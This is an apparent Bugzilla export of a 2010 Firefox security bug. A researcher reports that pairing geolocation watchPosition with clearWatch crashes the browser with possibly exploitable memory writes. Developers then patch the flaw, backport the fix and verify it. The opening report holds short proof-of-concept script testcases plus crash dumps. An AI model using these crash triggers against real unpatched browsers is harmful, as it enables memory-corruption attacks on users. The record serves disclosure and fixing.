{"bugs": {"605307": {"comments": [{"id": 5019676, "count": 0, "text": "User-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6) Gecko/20100101 Firefox/4.0b6\nBuild Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6) Gecko/20100101 Firefox/4.0b6\n\nDescription:\nCalling watchPosition on the geolocation object with an object as argument\nfollowed by a clearWatch call leads to a crash. These crashes sometimes\nshow exploitable behaviour ( arbitray writes ).\n\nConfirmed Versions:\n-----------------------\n\tFirefox 4.0 beta 6\n\tFirefox 3.6.10\n\nTestcase:\n------------------------\n\nSmallest testcase:\n<script>\no3=navigator;\no7=new Error();\no15=o3.geolocation;\no15.watchPosition(o7);\ntry{o15.clearWatch(1);}catch(e){}\n</script>\n\n\nMore likely to show exploitable behaviour:\n<script>\no3=navigator;\no7=new Error();\no15=o3.geolocation;\nfor(var x=0; x<10;x++) o15.watchPosition(o7);\nfor(var x=0; x<10;x++) try{o15.clearWatch(x+1);}catch(e){}\n</script>\n\n\nTestcase Notes:\n-----------------------\nThe testcase might need several reloads in the browser.\n\nStack Backtrace:\n\nLinux:\neax            0xa5a5a5a5       -1515870811\necx            0xb7db6ff4       -1210355724\nedx            0x0      0\nebx            0xb7db6ff4       -1210355724\nesp            0xbfffd4c0       0xbfffd4c0\nebp            0xbfffd4e8       0xbfffd4e8\nesi            0xbfffd614       -1073752556\nedi            0x1      1\neip            0xb6ceaac7       0xb6ceaac7 <nsGeolocation::ClearWatch(int)+51>\neflags         0x10286  [ PF SF IF RF ]\ncs             0x73     115\nss             0x7b     123\nds             0x7b     123\nes             0x7b     123\nfs             0x0      0\ngs             0x33     51\n=> 0xb6ceaac7 <_ZN13nsGeolocation10ClearWatchEi+51>:    movb   $0x1,0x29(%eax)\n   0xb6ceaacb <_ZN13nsGeolocation10ClearWatchEi+55>:    xor    %eax,%eax\n   0xb6ceaacd <_ZN13nsGeolocation10ClearWatchEi+57>:    add    $0xc,%esp\n\n\nProgram received signal SIGSEGV, Segmentation fault.\nnsGeolocation::ClearWatch (this=0xa7652b80, aWatchId=1) at /home/ubuntu/build/src/dom/src/geolocation/nsGeolocation.cpp:979\nwarning: Source file is more recent than executable.\n979       mWatchingCallbacks[aWatchId]->MarkCleared();\n#0  nsGeolocation::ClearWatch (this=0xa7652b80, aWatchId=1) at /home/ubuntu/build/src/dom/src/geolocation/nsGeolocation.cpp:979\n#1  0xb757e9ab in NS_InvokeByIndex_P () from /home/ubuntu/build/debug/dist/bin/libxul.so\n#2  0xb7018a8d in CallMethodHelper::Call() () from /home/ubuntu/build/debug/dist/bin/libxul.so\n#3  0xb701288c in XPCWrappedNative::CallMethod (ccx=..., mode=XPCWrappedNative::CALL_METHOD)\n    at /home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednative.cpp:2304\n#4  0xb701f2eb in XPC_WN_CallMethod (cx=0xaec27000, obj=0xaaa39f90, argc=2862849936, argv=0xb21fd428, vp=0xb21fd508)\n    at /home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1738\n#5  0xb7710d2a in callJSNative (cx=0xaec27000, fun=<value optimized out>, script=0x0,\n    native=0xb701f18c <XPC_WN_CallMethod(JSContext*, JSObject*, unsigned int, jsval_layout*, jsval_layout*)>, argsRef=..., flags=2)\n\n\nWindows:\n(1b5c.13b8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nxul!nsGeolocation::ClearWatch+0x1d:\n5f12fde1 c6402501        mov     byte ptr [eax+25h],1       ds:002b:6c6d7853=6c\n\nxul!nsGeolocation::ClearWatch+0x1d\nxul!NS_InvokeByIndex_P+0x27\nxul!XPC_WN_CallMethod+0x886\nMOZCRT19!arena_dalloc+0x39\nxul!js::MonitorLoopEdge+0x87f\nxul!js::Interpret+0x24c0\nxul!js::Execute+0x392\nxul!JS_EvaluateUCScriptForPrincipals+0x59\nxul!nsJSContext::EvaluateString+0x18a\nxul!nsScriptLoader::EvaluateScript+0x17c\nxul!nsScriptLoader::ProcessRequest+0xb2\nxul!nsScriptLoader::ProcessScriptElement+0x2f3\nxul!nsScriptElement::MaybeProcessScript+0x8c\nxul!nsHTMLScriptElement::MaybeProcessScript+0x1e\nxul!nsHTMLScriptElement::DoneAddingChildren+0xf\nxul!nsHtml5TreeOpExecutor::RunScript+0x7f\nxul!nsHtml5TreeOpExecutor::RunFlushLoop+0x2a1\nxul!nsHtml5ExecutorReflusher::Run+0x11\nxul!nsThread::ProcessNextEvent+0x17a\nxul!mozilla::ipc::MessagePump::Run+0x6e\n\n\nMy reference #\t  : d4f8755506e48534c2eb4dda39a054c1_1\nVulnDev reference : vd10002\n\n\nreported by nils of vulndev ltd.\n\n\nReproducible: Always\n\nSteps to Reproduce:\n1. save testcase to html file\n2. load testcase\n3. crash\nActual Results:  \ncrash\n\nExpected Results:  \nno crash", "author": "nils@vulndev.org", "bug_id": 605307, "tags": [], "creator": "nils@vulndev.org", "attachment_id": null, "raw_text": "User-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6) Gecko/20100101 Firefox/4.0b6\nBuild Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6) Gecko/20100101 Firefox/4.0b6\n\nDescription:\nCalling watchPosition on the geolocation object with an object as argument\nfollowed by a clearWatch call leads to a crash. These crashes sometimes\nshow exploitable behaviour ( arbitray writes ).\n\nConfirmed Versions:\n-----------------------\n\tFirefox 4.0 beta 6\n\tFirefox 3.6.10\n\nTestcase:\n------------------------\n\nSmallest testcase:\n<script>\no3=navigator;\no7=new Error();\no15=o3.geolocation;\no15.watchPosition(o7);\ntry{o15.clearWatch(1);}catch(e){}\n</script>\n\n\nMore likely to show exploitable behaviour:\n<script>\no3=navigator;\no7=new Error();\no15=o3.geolocation;\nfor(var x=0; x<10;x++) o15.watchPosition(o7);\nfor(var x=0; x<10;x++) try{o15.clearWatch(x+1);}catch(e){}\n</script>\n\n\nTestcase Notes:\n-----------------------\nThe testcase might need several reloads in the browser.\n\nStack Backtrace:\n\nLinux:\neax            0xa5a5a5a5       -1515870811\necx            0xb7db6ff4       -1210355724\nedx            0x0      0\nebx            0xb7db6ff4       -1210355724\nesp            0xbfffd4c0       0xbfffd4c0\nebp            0xbfffd4e8       0xbfffd4e8\nesi            0xbfffd614       -1073752556\nedi            0x1      1\neip            0xb6ceaac7       0xb6ceaac7 <nsGeolocation::ClearWatch(int)+51>\neflags         0x10286  [ PF SF IF RF ]\ncs             0x73     115\nss             0x7b     123\nds             0x7b     123\nes             0x7b     123\nfs             0x0      0\ngs             0x33     51\n=> 0xb6ceaac7 <_ZN13nsGeolocation10ClearWatchEi+51>:    movb   $0x1,0x29(%eax)\n   0xb6ceaacb <_ZN13nsGeolocation10ClearWatchEi+55>:    xor    %eax,%eax\n   0xb6ceaacd <_ZN13nsGeolocation10ClearWatchEi+57>:    add    $0xc,%esp\n\n\nProgram received signal SIGSEGV, Segmentation fault.\nnsGeolocation::ClearWatch (this=0xa7652b80, aWatchId=1) at /home/ubuntu/build/src/dom/src/geolocation/nsGeolocation.cpp:979\nwarning: Source file is more recent than executable.\n979       mWatchingCallbacks[aWatchId]->MarkCleared();\n#0  nsGeolocation::ClearWatch (this=0xa7652b80, aWatchId=1) at /home/ubuntu/build/src/dom/src/geolocation/nsGeolocation.cpp:979\n#1  0xb757e9ab in NS_InvokeByIndex_P () from /home/ubuntu/build/debug/dist/bin/libxul.so\n#2  0xb7018a8d in CallMethodHelper::Call() () from /home/ubuntu/build/debug/dist/bin/libxul.so\n#3  0xb701288c in XPCWrappedNative::CallMethod (ccx=..., mode=XPCWrappedNative::CALL_METHOD)\n    at /home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednative.cpp:2304\n#4  0xb701f2eb in XPC_WN_CallMethod (cx=0xaec27000, obj=0xaaa39f90, argc=2862849936, argv=0xb21fd428, vp=0xb21fd508)\n    at /home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1738\n#5  0xb7710d2a in callJSNative (cx=0xaec27000, fun=<value optimized out>, script=0x0,\n    native=0xb701f18c <XPC_WN_CallMethod(JSContext*, JSObject*, unsigned int, jsval_layout*, jsval_layout*)>, argsRef=..., flags=2)\n\n\nWindows:\n(1b5c.13b8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nxul!nsGeolocation::ClearWatch+0x1d:\n5f12fde1 c6402501        mov     byte ptr [eax+25h],1       ds:002b:6c6d7853=6c\n\nxul!nsGeolocation::ClearWatch+0x1d\nxul!NS_InvokeByIndex_P+0x27\nxul!XPC_WN_CallMethod+0x886\nMOZCRT19!arena_dalloc+0x39\nxul!js::MonitorLoopEdge+0x87f\nxul!js::Interpret+0x24c0\nxul!js::Execute+0x392\nxul!JS_EvaluateUCScriptForPrincipals+0x59\nxul!nsJSContext::EvaluateString+0x18a\nxul!nsScriptLoader::EvaluateScript+0x17c\nxul!nsScriptLoader::ProcessRequest+0xb2\nxul!nsScriptLoader::ProcessScriptElement+0x2f3\nxul!nsScriptElement::MaybeProcessScript+0x8c\nxul!nsHTMLScriptElement::MaybeProcessScript+0x1e\nxul!nsHTMLScriptElement::DoneAddingChildren+0xf\nxul!nsHtml5TreeOpExecutor::RunScript+0x7f\nxul!nsHtml5TreeOpExecutor::RunFlushLoop+0x2a1\nxul!nsHtml5ExecutorReflusher::Run+0x11\nxul!nsThread::ProcessNextEvent+0x17a\nxul!mozilla::ipc::MessagePump::Run+0x6e\n\n\nMy reference #\t  : d4f8755506e48534c2eb4dda39a054c1_1\nVulnDev reference : vd10002\n\n\nreported by nils of vulndev ltd.\n\n\nReproducible: Always\n\nSteps to Reproduce:\n1. save testcase to html file\n2. load testcase\n3. crash\nActual Results:  \ncrash\n\nExpected Results:  \nno crash", "creation_time": "2010-10-18T22:37:35Z", "time": "2010-10-18T22:37:35Z", "is_private": false}, {"time": "2010-10-19T02:43:00Z", "id": 5020295, "creation_time": "2010-10-19T02:43:00Z", "count": 1, "attachment_id": 484212, "creator": "doug.turner@gmail.com", "raw_text": "", "bug_id": 605307, "tags": [], "is_private": false, "text": "Created attachment 484212\npatch v.1", "author": "doug.turner@gmail.com"}, {"creation_time": "2010-10-19T02:44:21Z", "time": "2010-10-19T02:44:21Z", "creator": "doug.turner@gmail.com", "attachment_id": null, "raw_text": "simple fix; we should back port this to 1.9.2.", "is_private": false, "id": 5020299, "count": 2, "bug_id": 605307, "tags": [], "text": "simple fix; we should back port this to 1.9.2.", "author": "doug.turner@gmail.com"}, {"bug_id": 605307, "tags": [], "text": "1.9.1 has the same code and is still supported.", "author": "dveditz@mozilla.com", "id": 5021745, "count": 3, "is_private": false, "time": "2010-10-19T17:25:34Z", "creation_time": "2010-10-19T17:25:34Z", "attachment_id": null, "creator": "dveditz@mozilla.com", "raw_text": "1.9.1 has the same code and is still supported."}, {"is_private": false, "creator": "dveditz@mozilla.com", "attachment_id": 484212, "raw_text": "r=dveditz", "creation_time": "2010-10-19T17:26:37Z", "time": "2010-10-19T17:26:37Z", "text": "Comment on attachment 484212\npatch v.1\n\nr=dveditz", "author": "dveditz@mozilla.com", "bug_id": 605307, "tags": [], "id": 5021750, "count": 4}, {"tags": [], "bug_id": 605307, "author": "doug.turner@gmail.com", "text": "Discussed with dveditz yesterday.  Felt it could be exploitable.  The patch is very simple and includes a test case -- basically improving an existing test case.\n\nFurther discussed with devitz that I should land my fix on m-c, and request approval for 1.9.1 and 1.9.2\n\nPushed to mozilla-central:\nhttp://hg.mozilla.org/mozilla-central/rev/d5d273398344\n\nWaiting for permission for 1.9.1 and 1.9.2.", "count": 5, "id": 5022211, "is_private": false, "creation_time": "2010-10-19T19:36:02Z", "time": "2010-10-19T19:36:02Z", "raw_text": "Discussed with dveditz yesterday.  Felt it could be exploitable.  The patch is very simple and includes a test case -- basically improving an existing test case.\n\nFurther discussed with devitz that I should land my fix on m-c, and request approval for 1.9.1 and 1.9.2\n\nPushed to mozilla-central:\nhttp://hg.mozilla.org/mozilla-central/rev/d5d273398344\n\nWaiting for permission for 1.9.1 and 1.9.2.", "creator": "doug.turner@gmail.com", "attachment_id": null}, {"raw_text": "This is a blocker, doesn't need approval to land...", "creator": "jstenback+bmo@gmail.com", "attachment_id": 484212, "count": 6, "creation_time": "2010-10-19T21:14:07Z", "id": 5022599, "time": "2010-10-19T21:14:07Z", "author": "jstenback+bmo@gmail.com", "text": "Comment on attachment 484212\npatch v.1\n\nThis is a blocker, doesn't need approval to land...", "is_private": false, "tags": [], "bug_id": 605307}, {"attachment_id": null, "creator": "dveditz@mozilla.com", "raw_text": "(In reply to comment #6)\n> This is a blocker, doesn't need approval to land...\n\n...for Firefox 4/trunk. Stable branches have different rules and always require patch approval. (jst knows this, just don't want others to read this bug and interpret his comment too broadly.)\n\nComment 5 looks like a trunk fix was checked in, marking bug so. Branch status is tracked in the \"status1.9.x\" custom fields.", "time": "2010-10-20T17:19:57Z", "creation_time": "2010-10-20T17:19:57Z", "is_private": false, "id": 5024871, "count": 7, "text": "(In reply to comment #6)\n> This is a blocker, doesn't need approval to land...\n\n...for Firefox 4/trunk. Stable branches have different rules and always require patch approval. (jst knows this, just don't want others to read this bug and interpret his comment too broadly.)\n\nComment 5 looks like a trunk fix was checked in, marking bug so. Branch status is tracked in the \"status1.9.x\" custom fields.", "author": "dveditz@mozilla.com", "bug_id": 605307, "tags": []}, {"is_private": false, "raw_text": "a=LegNeato for 1.9.2.12 and 1.9.1.15", "creator": "christian@legnitto.com", "attachment_id": 484212, "creation_time": "2010-10-20T17:37:54Z", "time": "2010-10-20T17:37:54Z", "author": "christian@legnitto.com", "text": "Comment on attachment 484212\npatch v.1\n\na=LegNeato for 1.9.2.12 and 1.9.1.15", "tags": [], "bug_id": 605307, "count": 8, "id": 5024939}, {"count": 9, "time": "2010-10-21T01:14:02Z", "creation_time": "2010-10-21T01:14:02Z", "id": 5026432, "raw_text": "http://hg.mozilla.org/releases/mozilla-1.9.2/rev/74e4421e0a30\nhttp://hg.mozilla.org/releases/mozilla-1.9.1/rev/ca9afc176ebb\n\nThe tests could not land as they include testing features not available unless we back port a bunch of stuff.  I don't think it matters that much since we have the tests running on m-c, and I don't plan on adding anything else to geo on these branches.", "attachment_id": null, "creator": "doug.turner@gmail.com", "tags": [], "is_private": false, "bug_id": 605307, "author": "doug.turner@gmail.com", "text": "http://hg.mozilla.org/releases/mozilla-1.9.2/rev/74e4421e0a30\nhttp://hg.mozilla.org/releases/mozilla-1.9.1/rev/ca9afc176ebb\n\nThe tests could not land as they include testing features not available unless we back port a bunch of stuff.  I don't think it matters that much since we have the tests running on m-c, and I don't plan on adding anything else to geo on these branches."}, {"creator": "albill@gmail.com", "attachment_id": null, "raw_text": "Verified for 1.9.2 with Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13pre) Gecko/20101118 Namoroka/3.6.13pre. Watched the crash with the testcases in comment 0 with 1.9.2.12.\n\nVerified for 1.9.1 with Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.16pre) Gecko/20101118 Shiretoko/3.5.16pre as well.", "creation_time": "2010-11-19T00:12:42Z", "time": "2010-11-19T00:12:42Z", "is_private": false, "id": 5092293, "count": 10, "text": "Verified for 1.9.2 with Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13pre) Gecko/20101118 Namoroka/3.6.13pre. Watched the crash with the testcases in comment 0 with 1.9.2.12.\n\nVerified for 1.9.1 with Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.16pre) Gecko/20101118 Shiretoko/3.5.16pre as well.", "author": "albill@gmail.com", "bug_id": 605307, "tags": []}]}}, "comments": {}}